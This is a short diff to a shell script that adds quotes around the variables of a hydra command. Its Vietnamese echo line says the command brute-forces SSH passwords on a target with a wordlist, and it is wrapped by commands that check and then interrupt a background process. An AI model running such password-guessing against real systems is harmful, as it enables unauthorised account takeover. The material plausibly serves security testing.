@@ -23,7 +23,7 @@ kill -0 "$PID"
 sleep 2
 
 echo "Chạy hydra dò mật khẩu SSH vào $TARGET"
-hydra -l $SSH_USER -P $WORDLIST -t 4 -f $TARGET ssh -o $OUT
+hydra -l "$SSH_USER" -P "$WORDLIST" -t 4 -f "$TARGET" ssh -o "$OUT"
 
 sleep 3
 kill -INT "$PID"
